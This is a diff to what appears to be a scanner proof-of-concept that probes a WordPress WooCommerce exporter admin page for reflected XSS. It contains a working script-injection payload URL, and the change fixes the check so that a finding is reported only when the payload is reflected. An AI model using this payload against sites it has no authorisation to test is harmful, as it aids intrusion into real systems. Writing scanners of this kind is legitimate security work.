@@ -36,7 +36,7 @@ class Poc(ABPoc):
             payload = '/wp/wp-admin/admin.php?page=woo_ce&tab=exportdataset=users1be3c<script>alert(cscan)<%2fscript>87acc&product_fields_order%5Bparent_id%5D=&product_fields_order%5Bparent_sku%5D=&product_fields_order%5Bproduct_id%5D=&product_fields_order%5Bsku%5D=&product_field'
             url = self.target + payload
             r = requests.get(url)
-            if r.status_code == 200 and '<script>alert(cscan)</script>':
+            if r.status_code == 200 and '<script>alert(cscan)</script>' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
